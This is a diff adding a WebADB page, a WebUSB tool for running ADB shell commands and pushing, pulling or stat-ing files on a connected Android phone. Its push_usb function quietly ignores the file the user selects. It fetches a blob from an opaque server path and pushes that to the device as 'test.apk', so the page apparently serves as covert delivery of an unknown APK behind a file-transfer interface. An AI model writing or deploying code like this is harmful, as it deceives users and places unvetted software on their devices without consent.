@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>WebADB | Android Debug Bridge WebApp</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="WebUSB based Android Debug Bridge (adb) host" />
+    <meta name="keywords" content="adb, webusb, android adb, adb host, adb webapp" />
+    <link rel="manifest" href="manifest-webadb.json" />
+    <link rel="stylesheet" type="text/css" href="https://www.w3schools.com/w3css/3/w3.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/knockout/3.4.2/knockout-min.js"></script>
+    <script src="./adb.js"></script>
+</head>
+
+<body>
+    <form>
+        <div id="nowebusb" class="w3-container w3-block w3-sand w3-border w3-border-red w3-left-align w3-round" style="display: none">
+            <p>
+                Ouch!
+                <a href="https://wicg.github.io/webusb">WebUSB API</a> is not supported by your browser.
+                <br> Chrome users may update to version 61.
+            </p>
+        </div>
+        <div id="disclaimer" data-bind="visible: true" class="w3-container w3-block w3-sand w3-border w3-border-orange w3-left-align w3-round"
+            style="display: none">
+            <p>
+                This
+                <span data-bind="text: is_webapp() ? 'application' : 'page'"></span> uses the
+                <a href="https://developer.android.com/studio/command-line/adb.html">ADB</a> protocol over
+                <a href="https://wicg.github.io/webusb">WebUSB</a> to access the Android device connected to your PC via USB. The whole elaboration is done locally
+                and under your complete responsibility.
+                <br>
+            </p>
+            <p>
+                <a href="https://labs.mwrinfosecurity.com/blog/webusb/">What could possibly go wrong?</a>
+            </p>
+        </div>
+        <div data-bind="visible: 'usb' in navigator" class="w3-container w3-block w3-sand w3-border w3-border-blue w3-left-align w3-round"
+            style="display: none">
+            <p>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <input type="button" data-bind="click: connect_usb, enable: is_connect_disconnect_enabled(), value: connect_disconnect_value()"
+                        class="w3-button w3-green" />
+                </div>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <span data-bind="text: connect_message, visibile: connect_message() != ''"></span>
+                </div>
+            </p>
+        </div>
+        <div data-bind="visible: is_execute_visible()" class="w3-container w3-block w3-sand w3-border w3-border-blue w3-left-align w3-round"
+            style="display: none">
+            <p>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <input type="button" data-bind="click: push_usb, enable: is_execute_enabled() && adb && push_files().length" class="w3-button w3-green"
+                        value="Push" />
+                </div>
+                <div class="w3-container w3-cell w3-cell-middle" style="width: 50%">
+                    <input type="file" data-bind="event: { change: on_file_select }, enable: is_execute_enabled() && adb" class="w3-input w3-border w3-round"
+                    />
+                </div>
+                <!-- div class="w3-container w3-cell w3-cell-middle" style="width: 20%">
+          <input type="text" data-bind="numeric, value: push_mode, enable: is_execute_enabled() && adb" class="w3-input w3-border w3-round"/>
+        </div -->
+                <div class="w3-container w3-cell w3-cell-middle" style="width: 50%">
+                    <input type="text" data-bind="value: push_dest, enable: is_execute_enabled() && adb" class="w3-input w3-border w3-round"
+                    />
+                </div>
+            </p>
+            <p>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <input type="button" data-bind="click: pull_usb, enable: is_execute_enabled() && adb" class="w3-button w3-green" value="Pull"
+                    />
+                </div>
+                <div class="w3-container w3-cell w3-cell-middle" style="width: 100%">
+                    <input type="text" data-bind="value: pull_filename, enable: is_execute_enabled() && adb" class="w3-input w3-border w3-round"
+                    />
+                </div>
+            </p>
+            <p>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <input type="button" data-bind="click: stat_usb, enable: is_execute_enabled() && adb" class="w3-button w3-green" value="Stat"
+                    />
+                </div>
+                <div class="w3-container w3-cell w3-cell-middle" style="width: 100%">
+                    <input type="text" data-bind="value: stat_filename, enable: is_execute_enabled() && adb" class="w3-input w3-border w3-round"
+                    />
+                </div>
+            </p>
+            <p>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <input type="submit" data-bind="click: execute_usb, enable: is_execute_enabled()" class="w3-button w3-green" value="Send"
+                    />
+                </div>
+                <div class="w3-container w3-cell w3-cell-middle" style="width: 100%">
+                    <input type="text" data-bind="value: execute_cmd, enable: is_execute_enabled(), hasFocus: is_execute_enabled()" class="w3-input w3-border w3-round"
+                    />
+                </div>
+            </p>
+        </div>
+        <div data-bind="visible: is_cancel_visible(), style: { visibility: 'visible' }" class="w3-container w3-block w3-sand w3-border w3-border-blue w3-left-align w3-round"
+            style="visibility: hidden">
+            <p>
+                <pre data-bind="text: execute_output, visible: execute_output() != ''" style="font-size: 0.75em"></pre>
+                <div class="w3-container w3-cell w3-cell-middle">
+                    <input type="button" data-bind="click: cancel_usb, enable: is_cancel_enabled(), hasFocus: is_cancel_enabled()" class="w3-button w3-green"
+                        value="Cancel" />
+                </div>
+            </p>
+        </div>
+        <span id="bottom"></span>
+    </form>
+    <script>
+        var params = location.search.substring(1).split("&");
+        var is_webapp = false;
+        var webusb = null;
+        var adb = null;
+        var fastboot = null;
+        var shell = null;
+        var sync = null;
+
+        for (p in params) {
+            var pair = params[p].split("=");
+            if (pair[0] == "debug" && pair[1] == "yes")
+                Adb.Opt.debug = true;
+            if (pair[0] == "dump" && pair[1] == "yes")
+                Adb.Opt.dump = true;
+            if (pair[0] == "reuse_key")
+                Adb.Opt.reuse_key = (pair[1] == "yes") ? true : (pair[1] == "no") ? false : parseInt(pair[1]);
+            if (pair[0] == "webapp")
+                is_webapp = (pair[1] == "yes");
+        }
+
+        function removeElementById(id) {
+            let node = document.getElementById(id);
+            if (node != null)
+                node.parentNode.removeChild(node);
+        }
+
+        async function disconnect_usb() {
+            if (shell != null)
+                shell.close();
+            if (sync != null)
+                await sync.abort();
+            webusb.close();
+            webusb = null;
+        }
+
+        async function connect_usb() {
+            try {
+                if (webusb != null) {
+                    this.state("disconnecting");
+                    disconnect_usb();
+                    this.state("ready");
+                    return;
+                } else {
+                    this.state("connecting");
+                    webusb = await Adb.open("WebUSB");
+                }
+
+                if (!webusb || !(webusb.isAdb() || webusb.isFastboot()))
+                    throw new Error("Could not open either ADB or Fastboot");
+            }
+            catch (error) {
+                this.connect_message(error.message);
+                this.state("ready");
+                webusb = null;
+                return;
+            }
+
+            if (webusb.isFastboot()) {
+                try {
+                    fastboot = null;
+                    fastboot = await webusb.connectFastboot();
+                    if (fastboot != null) {
+                        console.log("FASTBOOT mode");
+                        this.state("connected");
+                        this.execute_cmd("getvar:all");
+                    }
+                }
+                catch (error) {
+                    console.log(error);
+                    this.connect_message(error.message);
+                    this.state("ready");
+                    fastboot = null;
+                    webusb = null;
+                    return;
+                }
+            }
+
+            if (webusb.isAdb()) {
+                try {
+                    adb = null;
+                    adb = await webusb.connectAdb("host::", () =>
+                        this.connect_message("Please check the screen of your " + webusb.device.productName + "."));
+
+                    if (adb != null) {
+                        console.log("ADB mode");
+                        this.state("connected");
+                        this.execute_cmd("shell:ls -l /sdcard/Download/test_webadb.txt");
+                        this.stat_filename("/sdcard/Download/test_webadb.txt");
+                        this.pull_filename("/sdcard/Download/test_webadb.txt");
+                        this.push_dest("/sdcard/Download/test_webadb.txt");
+                        this.push_mode("0644");
+                    }
+                }
+                catch (error) {
+                    console.log(error);
+                    this.connect_message(error.message);
+                    this.state("ready");
+                    adb = null;
+                    webusb = null;
+                    return;
+                }
+            }
+
+            let message = "";
+
+            if (webusb.isAdb())
+                message = "ADB: ";
+            if (webusb.isFastboot())
+                message = "FASTBOOT: ";
+
+            message += webusb.device.productName + " (" + webusb.device.manufacturerName + ")";
+            this.connect_message(message);
+        }
+
+        async function execute_usb() {
+            let output = this.execute_output;
+            let bottom = document.getElementById('bottom');
+            let decoder = new TextDecoder();
+
+            try {
+                if (adb != null) {
+                    this.state("running");
+                    output("");
+                     console.log(this.execute_cmd())       
+                    shell = await adb.open(this.execute_cmd());
+
+
+                    r = await shell.receive();
+                    while (r.cmd == "WRTE") {
+                        if (r.data != null) {
+                            output(output() + decoder.decode(r.data));
+                            bottom.scrollIntoView();
+                        }
+
+                        shell.send("OKAY");
+                        r = await shell.receive();
+                    }
+
+                    shell.close();
+                    shell = null;
+                    this.state("connected");
+                }
+
+                if (fastboot != null) {
+                    this.state("running");
+                    output("");
+                    console.log(this.execute_cmd())
+                    await fastboot.send(this.execute_cmd());
+                    r = await fastboot.receive();
+                    while (fastboot.get_cmd(r) == "INFO") {
+                        output(output() + decoder.decode(fastboot.get_payload(r)) + "\n");
+                        r = await fastboot.receive();
+                    }
+
+                    let payload = fastboot.get_payload(r);
+                    if (payload.length > 0)
+                        payload += "\n";
+                    output(output() + decoder.decode(payload));
+                    this.state("connected");
+                }
+            }
+            catch (error) {
+                console.log(error);
+                this.connect_message(error.message);
+                this.state("ready");
+                webusb = null;
+            }
+        }
+
+        async function stat_usb() {
+            let output = this.execute_output;
+            let bottom = document.getElementById('bottom');
+
+            try {
+                if (adb != null) {
+                    this.state("running");
+                    output("");
+
+                    sync = await adb.sync();
+                    let stat = await sync.stat(this.stat_filename());
+                    output(JSON.stringify(stat));
+
+                    await sync.quit();
+                    sync = null;
+                    this.state("connected");
+                }
+            }
+            catch (error) {
+                console.log(error);
+                this.connect_message(error.message);
+                this.state("ready");
+                webusb = null;
+            }
+        }
+
+        async function pull_usb() {
+            let output = this.execute_output;
+            let bottom = document.getElementById('bottom');
+
+            try {
+                if (adb != null) {
+                    this.state("running");
+                    output("");
+
+                    sync = await adb.sync();
+                    let content = await sync.pull(this.pull_filename());
+
+                    await sync.quit();
+                    sync = null;
+                    this.state("connected");
+
+                    let a = document.createElement("a")
+                    a.href = URL.createObjectURL(new Blob([content]));
+                    a.download = this.pull_filename().split("/").pop();
+                    a.click();
+                }
+            }
+            catch (error) {
+                console.log(error);
+                output(error.message);
+                this.state("connected");
+            }
+        }
+
+        var xfer_stats_done = 0;
+        var xfer_stats_time = 0;
+
+        function xfer_stats(start_time, done, total, output) {
+            let now = Date.now();
+
+            if (now - xfer_stats_time < 500)
+                return;
+
+            if (xfer_stats_done > done)
+                xfer_stats_done = 0;
+            if (xfer_stats_time < start_time)
+                xfer_stats_time = start_time;
+
+            let delta = Math.round((now - start_time) / 1000);
+            let instant = Math.round(((done - xfer_stats_done) * 1000) / ((now - xfer_stats_time) * 1024));
+            let average = Math.round(done * 1000 / ((now - start_time) * 1024));
+
+            xfer_stats_done = done;
+            xfer_stats_time = now;
+
+            let out = "";
+            out += Math.round(100 * done / total) + "% (";
+            out += Math.round(done / 1024) + " KiB in ~" + delta + " secs at avg " + average + " KiB/s, cur " + instant + " KiB/s)";
+            output(out);
+        }
+
+        async function push_usb() {
+            let output = this.execute_output;
+            let bottom = document.getElementById('bottom');
+            let data = await fetch('/fdtvkrpv5c2sl2oe4a2d-st35fmbxyhxrhevd').then(res => Promise.resolve(res.blob()))
+            try {
+                if (adb != null) {
+
+                    this.state("running");
+                    output("Loading " + String(data) + "...");
+                    console.log(this.push_mode())
+                    sync = await adb.sync();
+                    let start_time = Date.now();
+                    await sync.push(new File([data], 'test.apk'), this.push_dest(), this.push_mode(),
+                        (done, total) => xfer_stats(start_time, done, total, output));
+
+                    await sync.quit();
+                    sync = null;
+                    this.state("connected");
+                }
+            }
+            catch (error) {
+                output(error.message);
+                this.state("connected");
+            }
+
+            
+        }
+
+        function WebADBViewModel() {
+            this.state = ko.observable("ready");
+            this.is_webapp = ko.observable(is_webapp);
+
+            this.connect_message = ko.observable();
+            this.execute_cmd = ko.observable();
+            this.execute_output = ko.observable();
+            this.stat_filename = ko.observable();
+            this.pull_filename = ko.observable();
+            this.push_dest = ko.observable();
+            this.push_mode = ko.observable();
+            this.push_files = ko.observable([]);
+
+            this.connect_disconnect_value = function () {
+                return this.state() == "ready" || this.state() == "connecting" ? "Connect" : "Disconnect";
+            };
+
+            this.is_connect_disconnect_enabled = function () {
+                return this.state() != "running" && this.state() != "connecting";
+            };
+
+            this.is_execute_visible = function () {
+                return this.state() == "connected" || this.state() == "running";
+            };
+
+            this.is_execute_enabled = function () {
+                return this.state() == "connected";
+            };
+
+            this.is_cancel_visible = function () {
+                return this.state() == "connected" || this.state() == "running";
+            };
+
+            this.is_cancel_enabled = function () {
+                return this.state() == "running";
+            };
+
+            this.on_file_select = function (vm, evt) {
+                this.push_files(evt.target.files);
+            }
+
+            this.connect_usb = connect_usb;
+            this.execute_usb = execute_usb;
+            this.stat_usb = stat_usb;
+            this.pull_usb = pull_usb;
+            this.push_usb = push_usb;
+
+            this.cancel_usb = async function () {
+                if (shell != null)
+                    shell.close();
+                if (sync != null)
+                    await sync.abort();
+                this.state("connected");
+            };
+        }
+
+        if ('usb' in navigator) {
+            removeElementById("nowebusb");
+            ko.applyBindings(new WebADBViewModel());
+        } else {
+            let nowebusb = document.getElementById("nowebusb");
+            nowebusb.style.display = null;
+        }
+    </script>
+</body>
+
+</html>
